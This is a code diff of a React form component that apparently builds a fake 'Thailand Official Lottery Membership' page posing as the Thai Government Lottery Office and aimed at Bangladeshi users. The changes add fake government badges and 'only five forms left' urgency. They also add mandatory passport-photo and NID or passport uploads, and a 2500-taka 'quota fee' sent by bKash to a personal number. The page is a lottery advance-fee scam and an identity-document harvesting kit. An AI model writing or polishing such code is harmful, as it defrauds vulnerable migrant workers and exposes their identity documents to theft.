@@ -4,20 +4,66 @@ import { Link } from 'react-router-dom';
 export default function OnlineForm({ isStandalonePage = false }) {
   const [formData, setFormData] = useState({
     name: '',
-    familyMembersName: '',
-    address: '',
     phone: '',
-    paymentMethod: 'Mastercard'
+    country: 'বাংলাদেশ (Bangladesh)',
+    customCountry: '',
+    govtPaymentMethod: 'Visa',
+    bkashSenderNumber: '',
+    bkashTrxId: ''
   });
 
+  const [photoFile, setPhotoFile] = useState(null);
+  const [nidFile, setNidFile] = useState(null);
+  const [activeCard, setActiveCard] = useState('name');
+  const [copiedBkash, setCopiedBkash] = useState(false);
   const [submitted, setSubmitted] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
 
-  const paymentOptions = [
-    { id: 'Mastercard', name: 'Mastercard', badge: 'mastercard' },
-    { id: 'Visa', name: 'VISA', badge: 'visa' },
-    { id: 'Apple Pay', name: 'Apple Pay', badge: 'apple-pay' },
-    { id: 'Google Pay', name: 'Google Pay', badge: 'google-pay' }
+  const bkashNumber = '01910243177';
+
+  const countryList = [
+    'বাংলাদেশ (Bangladesh)',
+    'সৌদি আরব (Saudi Arabia)',
+    'সংযুক্ত আরব আমিরাত (UAE - Dubai)',
+    'কাতার (Qatar)',
+    'ওমান (Oman)',
+    'কুয়েত (Kuwait)',
+    'বাহরাইন (Bahrain)',
+    'মালয়েশিয়া (Malaysia)',
+    'সিঙ্গাপুর (Singapore)',
+    'থাইল্যান্ড (Thailand)',
+    'অন্যান্য দেশ (Other Country)'
+  ];
+
+  const govtPaymentOptions = [
+    {
+      id: 'Visa',
+      name: 'Visa Card (ভিসা কার্ড)',
+      desc: 'আন্তর্জাতিক ডেবিট / ক্রেডিট কার্ড পেমেন্ট',
+      badge: 'VISA',
+      badgeClass: 'visa'
+    },
+    {
+      id: 'Mastercard',
+      name: 'Mastercard (মাস্টারকার্ড)',
+      desc: 'আন্তর্জাতিক মাস্টারকার্ড পেমেন্ট গেটওয়ে',
+      badge: 'Mastercard',
+      badgeClass: 'mastercard'
+    },
+    {
+      id: 'American Express',
+      name: 'American Express (অ্যামেক্স কার্ড)',
+      desc: 'গ্লোবাল অ্যামেক্স মেম্বারশিপ গেটওয়ে',
+      badge: 'AMEX',
+      badgeClass: 'amex'
+    },
+    {
+      id: 'Bank Transfer',
+      name: 'Direct Bank Transfer (সরাসরি ব্যাংক ট্রান্সফার)',
+      desc: 'থাইল্যান্ড সেন্ট্রাল ব্যাংক অনুমোদিত ট্রেজারি একাউন্ট',
+      badge: 'BANK',
+      badgeClass: 'bank'
+    }
   ];
 
   const handleChange = (e) => {
@@ -25,47 +71,87 @@ export default function OnlineForm({ isStandalonePage = false }) {
     setFormData((prev) => ({ ...prev, [name]: value }));
   };
 
+  const handlePhotoUpload = (e) => {
+    const file = e.target.files && e.target.files[0];
+    if (file) {
+      setPhotoFile({
+        name: file.name,
+        size: (file.size / 1024).toFixed(1) + ' KB',
+        preview: URL.createObjectURL(file)
+      });
+    }
+  };
+
+  const handleNidUpload = (e) => {
+    const file = e.target.files && e.target.files[0];
+    if (file) {
+      setNidFile({
+        name: file.name,
+        size: (file.size / 1024).toFixed(1) + ' KB',
+        preview: file.type.startsWith('image/') ? URL.createObjectURL(file) : null
+      });
+    }
+  };
+
+  const copyBkashNumber = () => {
+    if (navigator.clipboard) {
+      navigator.clipboard.writeText(bkashNumber);
+    }
+    setCopiedBkash(true);
+    setTimeout(() => setCopiedBkash(false), 2500);
+  };
+
   const handleSubmit = (e) => {
     e.preventDefault();
+
+    if (!photoFile) {
+      alert('অনুগ্রহ করে আপনার ১ কপি পাসপোর্ট সাইজ ছবি আপলোড করুন।');
+      setActiveCard('photo');
+      return;
+    }
+
+    if (!nidFile) {
+      alert('অনুগ্রহ করে আপনার জাতীয় পরিচয়পত্র (NID) বা পাসপোর্ট আপলোড করুন।');
+      setActiveCard('nid');
+      return;
+    }
+
+    if (!formData.bkashSenderNumber || !formData.bkashTrxId) {
+      alert('অনুগ্রহ করে বিকাশের প্রেরক নম্বর এবং ট্রানজেকশন আইডি (TrxID) প্রদান করুন।');
+      setActiveCard('bkash');
+      return;
+    }
+
     setIsSubmitting(true);
     setTimeout(() => {
       setIsSubmitting(false);
       setSubmitted(true);
-    }, 1000);
+      window.scrollTo({ top: 120, behavior: 'smooth' });
+    }, 1200);
+  };
+
+  const resetForm = () => {
+    setFormData({
+      name: '',
+      phone: '',
+      country: 'বাংলাদেশ (Bangladesh)',
+      customCountry: '',
+      govtPaymentMethod: 'Visa',
+      bkashSenderNumber: '',
+      bkashTrxId: ''
+    });
+    setPhotoFile(null);
+    setNidFile(null);
+    setActiveCard('name');
+    setSubmitted(false);
   };
 
   return (
-    <section className={`section form-section ${isStandalonePage ? 'standalone-form-section' : 'reveal-on-scroll'}`} id="online-form">
-      {isStandalonePage ? (
-        <div className="standalone-form-header">
-          <div className="standalone-form-badge-row">
-            <span className="premium-badge badge-green">
-              <span className="badge-symbol">✓</span>
-              <span>
-                <strong>OFFICIAL GLO FORM 2026</strong>
-                <small>থাইল্যান্ড সরকার অনুমোদিত</small>
-              </span>
-            </span>
-            <span className="premium-badge badge-gold">
-              <span className="badge-symbol">★</span>
-              <span>
-                <strong>VIP QUOTA ACTIVE</strong>
-                <small>বাকি মাত্র ৫টি ফর্ম</small>
-              </span>
-            </span>
-          </div>
-        </div>
-      ) : (
-        <div className="section-heading">
-          <p className="eyebrow">GLO REGISTRATION</p>
-          <h2>Official Membership Registration Form 2026</h2>
-          <p>
-            The Government Lottery Office (GLO) অনুমোদিত সিনিয়র এজেন্ট <strong>মোঃ ফাহিম চৌধুরী (Agent ID: TL-001)</strong> এর অধীনে আর মাত্র ৫টি ফর্ম বাকি:
-          </p>
-        </div>
-      )}
-
-      <div className="google-form-container" aria-label="Official Google Form Style Registration">
+    <section
+      className={`section form-section ${isStandalonePage ? 'standalone-form-section' : 'reveal-on-scroll'}`}
+      id="online-form"
+    >
+      <div className="google-form-container" aria-label="Google Forms Style Official Registration">
         {/* Google Form Top Card */}
         <div className="gform-top-card">
           <div className="gform-color-stripe" />
@@ -76,13 +162,13 @@ export default function OnlineForm({ isStandalonePage = false }) {
                   src="/assets/logo.png?v=4"
                   alt="Thailand Lottery Official Logo"
                   className="brand-logo"
-                  width="60"
-                  height="60"
+                  width="64"
+                  height="64"
                 />
               </span>
               <div className="gform-official-text">
                 <div className="gform-verified-badge-line">
-                  <span className="gform-govt-seal">สำนักงานสลากกินแบ่งรัฐบาล</span>
+                  <span className="gform-govt-seal">สำนักงานสลากกินแบ่งรัฐบาล • GLO BANGKOK</span>
                   <span className="gform-verified-tag">
                     <svg viewBox="0 0 24 24" width="16" height="16" aria-hidden="true">
                       <path
@@ -94,213 +180,456 @@ export default function OnlineForm({ isStandalonePage = false }) {
                         d="M10.09 16.72l-4.14-4.14 1.41-1.41 2.73 2.73 6.13-6.13 1.41 1.41-7.54 7.54z"
                       />
                     </svg>
-                    <span>ভেরিফাইড অফিসিয়াল পোর্টাল</span>
+                    <span>সরকারি অনুমোদিত পোর্টাল</span>
                   </span>
                 </div>
-                <h3 className="gform-main-heading">Thailand Official Lottery Membership Form 2026</h3>
+                <h1 className="gform-main-heading">Thailand Official Lottery Membership Form 2026</h1>
                 <p className="gform-subtext">
                   থাইল্যান্ড সরকারের গভর্নমেন্ট লটারি অফিস (GLO) দ্বারা সরাসরি নিয়ন্ত্রিত অফিসিয়াল অনলাইন আবেদনপত্র।
+                  সঠিক তথ্য প্রদান করে মেম্বারশিপ আবেদন সম্পন্ন করুন।
                 </p>
               </div>
             </div>
 
             <div className="gform-meta-banner">
               <span className="gform-fee-pill">
-                💰 রেজিস্ট্রেশন ফি: <strong>২৫০০ রিয়াল (2500 SAR)</strong>
+                🏛️ সরকারি কোটা ফি: <strong>২৫০০ টাকা (VIP Quota)</strong>
               </span>
               <span className="gform-quota-pill">
-                🚨 অবশিষ্ট কোটা: <strong>মাত্র ৫টি ফর্ম বাকি</strong>
+                🚨 অবশিষ্ট কোটা: <strong>আর মাত্র ৫টি ফর্ম বাকি</strong>
               </span>
             </div>
 
             <div className="gform-notice-box">
               <p>
-                ⚠️ দয়া করে সমস্ত সঠিক ও বৈধ তথ্য প্রদান করুন। ফর্ম সাবমিট করার পর আমাদের অফিসিয়াল এজেন্ট আপনার সাথে যোগাযোগ করবে।
+                ⚠️ দয়া করে সমস্ত সঠিক ও বৈধ তথ্য প্রদান করুন। ছবি ও পরিচয়পত্রের স্পষ্ট কপি আপলোড করা বাধ্যতামূলক।
               </p>
-              <span className="gform-required-note">* নির্দেশিত ঘরগুলো পূরণ করা বাধ্যতামূলক</span>
+              <span className="gform-required-note">* নির্দেশিত ঘরগুলো পূরণ করা বাধ্যতামূলক (* Indicates required question)</span>
             </div>
           </div>
         </div>
 
         {submitted ? (
+          /* Google Form Response Submitted Screen */
           <div className="gform-success-card">
-            <div className="gform-success-icon">✓</div>
-            <h3>আবেদন সফলভাবে গ্রহণ করা হয়েছে!</h3>
-            <p>
-              ধন্যবাদ <strong>{formData.name}</strong>। আপনার মেম্বারশিপ আবেদন সফলভাবে সাবমিট হয়েছে।
-            </p>
-            <div className="gform-success-meta">
-              <div><strong>রেজিস্ট্রেশন ফি:</strong> ২৫০০ রিয়াল (2500 SAR)</div>
-              <div><strong>পেমেন্ট মেথড:</strong> {formData.paymentMethod}</div>
-              <div><strong>স্ট্যাটাস:</strong> ভেরিফিকেশন প্রক্রিয়াধীন (GLO Verified)</div>
+            <div className="gform-color-stripe" />
+            <div className="gform-success-body">
+              <div className="gform-success-check-badge">✓</div>
+              <h2 className="gform-success-title">আপনার আবেদন সফলভাবে জমা হয়েছে!</h2>
+              <p className="gform-success-subtitle">
+                Your response has been recorded. থাইল্যান্ড গভর্নমেন্ট লটারি অফিস (GLO) মেম্বারশিপ পোর্টালে আপনার তথ্য সংরক্ষিত হয়েছে।
+              </p>
+
+              <div className="gform-receipt-summary">
+                <div className="gform-receipt-header">
+                  <span>📄 আবেদনপত্র রিসিট (Submission Receipt)</span>
+                  <span className="receipt-tag">STATUS: PENDING VERIFICATION</span>
+                </div>
+                <div className="gform-receipt-grid">
+                  <div className="receipt-row">
+                    <span className="receipt-label">আবেদনকারীর নাম:</span>
+                    <strong className="receipt-value">{formData.name}</strong>
+                  </div>
+                  <div className="receipt-row">
+                    <span className="receipt-label">মোবাইল / হোয়াটসঅ্যাপ:</span>
+                    <strong className="receipt-value">{formData.phone}</strong>
+                  </div>
+                  <div className="receipt-row">
+                    <span className="receipt-label">বর্তমান দেশ:</span>
+                    <strong className="receipt-value">
+                      {formData.country === 'অন্যান্য দেশ (Other Country)' ? formData.customCountry : formData.country}
+                    </strong>
+                  </div>
+                  <div className="receipt-row">
+                    <span className="receipt-label">ছবি আপলোড:</span>
+                    <strong className="receipt-value file-ok">✓ {photoFile ? photoFile.name : 'আপলোড সম্পন্ন'}</strong>
+                  </div>
+                  <div className="receipt-row">
+                    <span className="receipt-label">NID / পাসপোর্ট:</span>
+                    <strong className="receipt-value file-ok">✓ {nidFile ? nidFile.name : 'আপলোড সম্পন্ন'}</strong>
+                  </div>
+                  <div className="receipt-row">
+                    <span className="receipt-label">থাইল্যান্ড সরকারি পেমেন্ট মেথড:</span>
+                    <strong className="receipt-value highlight-govt">{formData.govtPaymentMethod}</strong>
+                  </div>
+                  <div className="receipt-row">
+                    <span className="receipt-label">বিকাশ প্রেরক নম্বর:</span>
+                    <strong className="receipt-value">{formData.bkashSenderNumber}</strong>
+                  </div>
+                  <div className="receipt-row">
+                    <span className="receipt-label">বিকাশ TrxID:</span>
+                    <strong className="receipt-value highlight-trx">{formData.bkashTrxId}</strong>
+                  </div>
+                </div>
+              </div>
+
+              <div className="gform-success-action-group">
+                <button
+                  type="button"
+                  className="button secondary gform-reset-btn"
+                  onClick={resetForm}
+                >
+                  নতুন আবেদন জমা দিন (Submit another response)
+                </button>
+              </div>
             </div>
-            <p className="gform-success-note">
-              আমাদের সিনিয়র এজেন্ট শীঘ্রই আপনার প্রদত্ত তথ্যের ভিত্তিতে যোগাযোগ করবেন।
-            </p>
-            <button
-              type="button"
-              className="button secondary"
-              onClick={() => {
-                setSubmitted(false);
-                setFormData({
-                  name: '',
-                  familyMembersName: '',
-                  address: '',
-                  phone: '',
-                  paymentMethod: 'Mastercard'
-                });
-              }}
-            >
-              নতুন আবেদন করুন
-            </button>
           </div>
         ) : (
-          <form className="gform-body" onSubmit={handleSubmit}>
-            {/* Field 1: Name */}
-            <div className="gform-question-card">
+          <form className="gform-body" onSubmit={handleSubmit} noValidate>
+            {/* 1. Name Card */}
+            <div
+              className={`gform-question-card ${activeCard === 'name' ? 'is-active-card' : ''}`}
+              onClick={() => setActiveCard('name')}
+            >
+              <div className="gform-card-left-indicator" aria-hidden="true" />
               <label className="gform-question-title" htmlFor="gform-name">
                 আপনার নাম (Full Name) <span className="gform-req">*</span>
               </label>
-              <p className="gform-question-desc">পাসপোর্ট বা আইডি কার্ড অনুযায়ী আপনার পূর্ণ নাম লিখুন</p>
-              <input
-                id="gform-name"
-                name="name"
-                type="text"
-                required
-                className="gform-text-input"
-                placeholder="আপনার পূর্ণ নাম লিখুন..."
-                value={formData.name}
-                onChange={handleChange}
-              />
+              <p className="gform-question-desc">জাতীয় পরিচয়পত্র বা পাসপোর্ট অনুযায়ী আপনার পূর্ণ নাম লিখুন</p>
+              <div className="gform-input-wrapper">
+                <input
+                  id="gform-name"
+                  name="name"
+                  type="text"
+                  required
+                  className="gform-underline-input"
+                  placeholder="Short answer text"
+                  value={formData.name}
+                  onChange={handleChange}
+                  onFocus={() => setActiveCard('name')}
+                />
+                <span className="gform-input-focus-line" aria-hidden="true" />
+              </div>
             </div>
 
-            {/* Field 2: Family Member's Name */}
-            <div className="gform-question-card">
-              <label className="gform-question-title" htmlFor="gform-family">
-                পরিবারের সদস্যের নাম (Family Member's Name) <span className="gform-req">*</span>
-              </label>
-              <p className="gform-question-desc">নমিনী অথবা জরুরি প্রয়োজনে যোগাযোগের জন্য পিতা/মাতা/স্ত্রী/স্বামীর নাম</p>
-              <input
-                id="gform-family"
-                name="familyMembersName"
-                type="text"
-                required
-                className="gform-text-input"
-                placeholder="পরিবারের সদস্যের নাম লিখুন..."
-                value={formData.familyMembersName}
-                onChange={handleChange}
-              />
-            </div>
-
-            {/* Field 3: Address */}
-            <div className="gform-question-card">
-              <label className="gform-question-title" htmlFor="gform-address">
-                বর্তমান ঠিকানা (Present Address) <span className="gform-req">*</span>
-              </label>
-              <p className="gform-question-desc">শহর, এলাকা, জেলা এবং দেশের নাম উল্লেখ করুন</p>
-              <textarea
-                id="gform-address"
-                name="address"
-                rows="3"
-                required
-                className="gform-text-input gform-textarea"
-                placeholder="আপনার পূর্ণ ঠিকানা লিখুন..."
-                value={formData.address}
-                onChange={handleChange}
-              />
-            </div>
-
-            {/* Field 4: Phone / WhatsApp */}
-            <div className="gform-question-card">
+            {/* 2. Phone / WhatsApp Card */}
+            <div
+              className={`gform-question-card ${activeCard === 'phone' ? 'is-active-card' : ''}`}
+              onClick={() => setActiveCard('phone')}
+            >
+              <div className="gform-card-left-indicator" aria-hidden="true" />
               <label className="gform-question-title" htmlFor="gform-phone">
-                ফোন / হোয়াটসঅ্যাপ নম্বর (Phone / WhatsApp) <span className="gform-req">*</span>
+                ফোন / হোয়াটসঅ্যাপ নম্বর (Phone / WhatsApp Number) <span className="gform-req">*</span>
               </label>
-              <p className="gform-question-desc">যে নম্বরে লাইভ রেজাল্ট ও নিশ্চিতকরণ কোড পাঠানো হবে</p>
-              <input
-                id="gform-phone"
-                name="phone"
-                type="tel"
-                required
-                className="gform-text-input"
-                placeholder="+966 / +880 / +66 ইত্যাদি কোডসহ নম্বর দিন..."
-                value={formData.phone}
-                onChange={handleChange}
-              />
-            </div>
-
-            {/* Field 5: Registration Fee (Fixed 2500 Riyal) */}
-            <div className="gform-question-card gform-fee-card">
-              <div className="gform-question-title">
-                রেজিস্ট্রেশন ফি (Registration Fee) <span className="gform-req">*</span>
-              </div>
-              <p className="gform-question-desc">সরকারি নির্ধারিত কোটা মেম্বারশিপ ফি</p>
-              <div className="gform-fee-display-box">
-                <div className="gform-fee-amount-badge">
-                  <span className="fee-icon">💵</span>
-                  <div className="fee-text-group">
-                    <strong className="fee-amount">২৫০০ রিয়াল (2500 SAR)</strong>
-                    <span className="fee-note">এককালীন সরকারি মেম্বারশিপ ফি (100% Verified)</span>
-                  </div>
-                </div>
-                <div className="gform-fee-radio-pill active">
-                  <input type="radio" checked readOnly id="fee-confirm" />
-                  <label htmlFor="fee-confirm">২৫০০ রিয়াল পরিশোধে সম্মত</label>
-                </div>
+              <p className="gform-question-desc">যে নম্বরে লাইভ রেজাল্ট ও মেম্বারশিপ কনফার্মেশন কোড পাঠানো হবে</p>
+              <div className="gform-input-wrapper">
+                <input
+                  id="gform-phone"
+                  name="phone"
+                  type="tel"
+                  required
+                  className="gform-underline-input"
+                  placeholder="+880 / +966 ইত্যাদি কান্ট্রি কোডসহ নম্বর দিন..."
+                  value={formData.phone}
+                  onChange={handleChange}
+                  onFocus={() => setActiveCard('phone')}
+                />
+                <span className="gform-input-focus-line" aria-hidden="true" />
               </div>
             </div>
 
-            {/* Field 6: Accepted Payment Methods */}
-            <div className="gform-question-card">
+            {/* 3. Country Name Card */}
+            <div
+              className={`gform-question-card ${activeCard === 'country' ? 'is-active-card' : ''}`}
+              onClick={() => setActiveCard('country')}
+            >
+              <div className="gform-card-left-indicator" aria-hidden="true" />
+              <label className="gform-question-title" htmlFor="gform-country">
+                দেশের নাম (Country Name) <span className="gform-req">*</span>
+              </label>
+              <p className="gform-question-desc">আপনি বর্তমানে যে দেশে অবস্থান করছেন তা নির্বাচন করুন</p>
+              <div className="gform-select-wrapper">
+                <select
+                  id="gform-country"
+                  name="country"
+                  required
+                  className="gform-dropdown-select"
+                  value={formData.country}
+                  onChange={handleChange}
+                  onFocus={() => setActiveCard('country')}
+                >
+                  {countryList.map((c) => (
+                    <option key={c} value={c}>
+                      {c}
+                    </option>
+                  ))}
+                </select>
+                <span className="gform-dropdown-arrow" aria-hidden="true">▼</span>
+              </div>
+
+              {formData.country === 'অন্যান্য দেশ (Other Country)' && (
+                <div className="gform-input-wrapper gform-sub-input">
+                  <input
+                    name="customCountry"
+                    type="text"
+                    required
+                    className="gform-underline-input"
+                    placeholder="আপনার দেশের নাম লিখুন..."
+                    value={formData.customCountry}
+                    onChange={handleChange}
+                  />
+                  <span className="gform-input-focus-line" aria-hidden="true" />
+                </div>
+              )}
+            </div>
+
+            {/* 4. Photo Upload Card */}
+            <div
+              className={`gform-question-card ${activeCard === 'photo' ? 'is-active-card' : ''}`}
+              onClick={() => setActiveCard('photo')}
+            >
+              <div className="gform-card-left-indicator" aria-hidden="true" />
               <div className="gform-question-title">
-                পেমেন্ট মেথড নির্বাচন করুন (Accepted Payment Method) <span className="gform-req">*</span>
+                প্রার্থীর পাসপোর্ট সাইজ ছবি (Photo Upload) <span className="gform-req">*</span>
               </div>
               <p className="gform-question-desc">
-                হোমপেজে প্রদর্শিত অনুমোদিত নিরাপদ পেমেন্ট মেথডসমূহের মধ্য থেকে নির্বাচন করুন
+                আবেদনকারীর ১ কপি সাম্প্রতিক স্পষ্ট পাসপোর্ট সাইজ ছবি আপলোড করুন (JPG, PNG সর্বোচ্চ 10MB)
               </p>
 
-              <div className="gform-payment-grid">
-                {paymentOptions.map((opt) => (
+              {photoFile ? (
+                <div className="gform-file-card-preview">
+                  <div className="gform-file-thumb">
+                    <img src={photoFile.preview} alt="Passport preview" />
+                  </div>
+                  <div className="gform-file-details">
+                    <span className="gform-file-name">{photoFile.name}</span>
+                    <span className="gform-file-size">{photoFile.size} • ছবি আপলোড সম্পন্ন</span>
+                  </div>
+                  <button
+                    type="button"
+                    className="gform-file-remove-btn"
+                    title="ফাইল মুছে নতুন ছবি দিন"
+                    onClick={() => setPhotoFile(null)}
+                  >
+                    ✕
+                  </button>
+                </div>
+              ) : (
+                <div className="gform-upload-action-box">
+                  <label htmlFor="gform-photo-input" className="gform-add-file-btn">
+                    <svg viewBox="0 0 24 24" width="20" height="20" aria-hidden="true">
+                      <path
+                        fill="#1A73E8"
+                        d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM14 13v4h-4v-4H7l5-5 5 5h-3z"
+                      />
+                    </svg>
+                    <span>Add file (ছবি আপলোড করুন)</span>
+                  </label>
+                  <input
+                    id="gform-photo-input"
+                    type="file"
+                    accept="image/png, image/jpeg, image/jpg, image/webp"
+                    className="gform-hidden-file-input"
+                    onChange={handlePhotoUpload}
+                    onFocus={() => setActiveCard('photo')}
+                  />
+                  <span className="gform-upload-hint">অথবা ফাইল টেনে এনে এখানে ছেড়ে দিন</span>
+                </div>
+              )}
+            </div>
+
+            {/* 5. NID / Passport Upload Card */}
+            <div
+              className={`gform-question-card ${activeCard === 'nid' ? 'is-active-card' : ''}`}
+              onClick={() => setActiveCard('nid')}
+            >
+              <div className="gform-card-left-indicator" aria-hidden="true" />
+              <div className="gform-question-title">
+                জাতীয় পরিচয়পত্র বা পাসপোর্ট আপলোড (NID / Passport Upload) <span className="gform-req">*</span>
+              </div>
+              <p className="gform-question-desc">
+                জাতীয় পরিচয়পত্র (NID) অথবা পাসপোর্টের প্রথম পাতার স্পষ্ট ছবি বা স্ক্যান কপি আপলোড করুন
+              </p>
+
+              {nidFile ? (
+                <div className="gform-file-card-preview">
+                  <div className="gform-file-thumb">
+                    {nidFile.preview ? (
+                      <img src={nidFile.preview} alt="NID preview" />
+                    ) : (
+                      <span className="gform-pdf-icon">📄</span>
+                    )}
+                  </div>
+                  <div className="gform-file-details">
+                    <span className="gform-file-name">{nidFile.name}</span>
+                    <span className="gform-file-size">{nidFile.size} • ডকুমেন্ট সংযুক্ত হয়েছে</span>
+                  </div>
+                  <button
+                    type="button"
+                    className="gform-file-remove-btn"
+                    title="ফাইল মুছে নতুন ডকুমেন্ট দিন"
+                    onClick={() => setNidFile(null)}
+                  >
+                    ✕
+                  </button>
+                </div>
+              ) : (
+                <div className="gform-upload-action-box">
+                  <label htmlFor="gform-nid-input" className="gform-add-file-btn">
+                    <svg viewBox="0 0 24 24" width="20" height="20" aria-hidden="true">
+                      <path
+                        fill="#1A73E8"
+                        d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM14 13v4h-4v-4H7l5-5 5 5h-3z"
+                      />
+                    </svg>
+                    <span>Add file (NID / পাসপোর্ট আপলোড করুন)</span>
+                  </label>
+                  <input
+                    id="gform-nid-input"
+                    type="file"
+                    accept="image/png, image/jpeg, image/jpg, image/webp, application/pdf"
+                    className="gform-hidden-file-input"
+                    onChange={handleNidUpload}
+                    onFocus={() => setActiveCard('nid')}
+                  />
+                  <span className="gform-upload-hint">পিডিএফ বা স্পষ্ট ছবি (সর্বোচ্চ 10MB)</span>
+                </div>
+              )}
+            </div>
+
+            {/* 6. Payment to Thailand Government Card */}
+            <div
+              className={`gform-question-card ${activeCard === 'govt-payment' ? 'is-active-card' : ''}`}
+              onClick={() => setActiveCard('govt-payment')}
+            >
+              <div className="gform-card-left-indicator" aria-hidden="true" />
+              <div className="gform-question-title">
+                Payment to Thailand Government (থাইল্যান্ড গভর্নমেন্ট পেমেন্ট নির্বাচন) <span className="gform-req">*</span>
+              </div>
+              <p className="gform-question-desc">
+                থাইল্যান্ড গভর্নমেন্ট লটারি অফিস (GLO) কেন্দ্রীয় ট্রেজারির আন্তর্জাতিক পেমেন্ট মেথড নির্বাচন করুন
+              </p>
+
+              <div className="gform-radio-group">
+                {govtPaymentOptions.map((opt) => (
                   <label
                     key={opt.id}
-                    className={`gform-payment-option ${formData.paymentMethod === opt.id ? 'is-selected' : ''}`}
+                    className={`gform-radio-row ${formData.govtPaymentMethod === opt.id ? 'is-checked' : ''}`}
                   >
                     <input
                       type="radio"
-                      name="paymentMethod"
+                      name="govtPaymentMethod"
                       value={opt.id}
-                      checked={formData.paymentMethod === opt.id}
+                      checked={formData.govtPaymentMethod === opt.id}
                       onChange={handleChange}
+                      onFocus={() => setActiveCard('govt-payment')}
+                      className="gform-radio-circle"
                     />
-                    <div className="gform-pay-brand-wrap">
-                      {opt.id === 'Mastercard' && (
-                        <span className="pay-brand mastercard gform-mini-pay">
-                          <i />
-                          <strong>mastercard</strong>
-                        </span>
-                      )}
-                      {opt.id === 'Visa' && (
-                        <span className="pay-brand visa gform-mini-pay">
-                          VISA
-                        </span>
-                      )}
-                      {opt.id === 'Apple Pay' && (
-                        <span className="pay-brand apple-pay gform-mini-pay">
-                          <span aria-hidden="true">●</span> Pay
-                        </span>
-                      )}
-                      {opt.id === 'Google Pay' && (
-                        <span className="pay-brand google-pay gform-mini-pay">
-                          <span aria-hidden="true">G</span> Pay
-                        </span>
-                      )}
-                      <span className="gform-pay-name">{opt.name}</span>
+                    <div className="gform-radio-label-wrap">
+                      <div className="gform-radio-title-line">
+                        <span className={`gform-pay-badge ${opt.badgeClass}`}>{opt.badge}</span>
+                        <strong className="gform-radio-main-text">{opt.name}</strong>
+                      </div>
+                      <span className="gform-radio-sub-text">{opt.desc}</span>
                     </div>
                   </label>
                 ))}
               </div>
 
-              <div className="gform-security-footer">
-                <span>🔒 256-Bit SSL এনক্রিপ্টেড ও সরাসরি সরকারি ট্রেজারিতে জমা</span>
+              <div className="gform-govt-notice">
+                <span className="gform-shield-icon">🛡️</span>
+                <span>অফিসিয়াল গভমেন্ট অথোরাইজেশন: GLO Notice 001/2566 ভেরিফাইড আন্তর্জাতিক ট্রেজারি গেটওয়ে।</span>
+              </div>
+            </div>
+
+            {/* 7. Membership Final Payment — বিকাশ (bKash Payment) */}
+            <div
+              className={`gform-question-card gform-bkash-card ${activeCard === 'bkash' ? 'is-active-card' : ''}`}
+              onClick={() => setActiveCard('bkash')}
+            >
+              <div className="gform-card-left-indicator" aria-hidden="true" />
+              <div className="gform-question-title">
+                মেম্বারশিপ ফাইনাল পেমেন্ট — বিকাশ (Final Membership Payment via bKash){' '}
+                <span className="gform-req">*</span>
+              </div>
+              <p className="gform-question-desc">
+                মেম্বারশিপ ও ভিআইপি কোটা নিশ্চিত করতে নিচে উল্লেখিত অফিসিয়াল বিকাশ নম্বরে Send Money সম্পন্ন করুন
+              </p>
+
+              {/* Elite bKash Official Box */}
+              <div className="gform-bkash-box">
+                <div className="bkash-header-bar">
+                  <div className="bkash-logo-brand">
+                    <span className="bkash-bird-icon">🌸</span>
+                    <strong>bKash Payment</strong>
+                  </div>
+                  <span className="bkash-type-badge">Send Money (পার্সোনাল)</span>
+                </div>
+
+                <div className="bkash-number-row">
+                  <div className="bkash-num-info">
+                    <span className="bkash-num-label">অফিসিয়াল বিকাশ নম্বর:</span>
+                    <strong className="bkash-display-number">{bkashNumber}</strong>
+                  </div>
+                  <button
+                    type="button"
+                    className={`bkash-copy-btn ${copiedBkash ? 'copied' : ''}`}
+                    onClick={copyBkashNumber}
+                  >
+                    {copiedBkash ? '✓ কপি হয়েছে!' : '📋 নম্বর কপি করুন'}
+                  </button>
+                </div>
+
+                <div className="bkash-fee-strip">
+                  <span>মেম্বারশিপ রেজিস্ট্রেশন ফি:</span>
+                  <strong className="bkash-fee-amount">২৫০০ টাকা (SAR 2500 সমমান কোটা)</strong>
+                </div>
+
+                <div className="bkash-instructions-box">
+                  <p>
+                    <strong>📌 বিকাশ পেমেন্ট নির্দেশিকা:</strong>
+                    <br />
+                    ১. আপনার বিকাশ অ্যাপ অথবা <strong>*247#</strong> ডায়াল করুন।
+                    <br />
+                    ২. <strong>Send Money</strong> অপশন নির্বাচন করে উপরের বিকাশ নম্বরটিতে <strong>২৫০০ টাকা</strong> পাঠান।
+                    <br />
+                    ৩. সফলভাবে টাকা পাঠানোর পর প্রাপ্ত <strong>TrxID</strong> এবং আপনার বিকাশ নম্বর নিচে লিখুন।
+                  </p>
+                </div>
+              </div>
+
+              {/* bKash Sender Number Input */}
+              <div className="gform-bkash-inputs-group">
+                <div className="gform-input-subcard">
+                  <label className="gform-sub-label" htmlFor="gform-bkash-sender">
+                    যে বিকাশ নম্বর থেকে টাকা পাঠিয়েছেন (Sender bKash Number) <span className="gform-req">*</span>
+                  </label>
+                  <div className="gform-input-wrapper">
+                    <input
+                      id="gform-bkash-sender"
+                      name="bkashSenderNumber"
+                      type="tel"
+                      required
+                      className="gform-underline-input"
+                      placeholder="01XXXXXXXXX"
+                      value={formData.bkashSenderNumber}
+                      onChange={handleChange}
+                      onFocus={() => setActiveCard('bkash')}
+                    />
+                    <span className="gform-input-focus-line" aria-hidden="true" />
+                  </div>
+                </div>
+
+                {/* bKash Transaction ID Input */}
+                <div className="gform-input-subcard">
+                  <label className="gform-sub-label" htmlFor="gform-bkash-trx">
+                    বিকাশ ট্রানজেকশন আইডি (bKash TrxID) <span className="gform-req">*</span>
+                  </label>
+                  <div className="gform-input-wrapper">
+                    <input
+                      id="gform-bkash-trx"
+                      name="bkashTrxId"
+                      type="text"
+                      required
+                      className="gform-underline-input"
+                      placeholder="উদাহরণ: BKA89XZ123"
+                      value={formData.bkashTrxId}
+                      onChange={handleChange}
+                      onFocus={() => setActiveCard('bkash')}
+                    />
+                    <span className="gform-input-focus-line" aria-hidden="true" />
+                  </div>
+                </div>
               </div>
             </div>
 
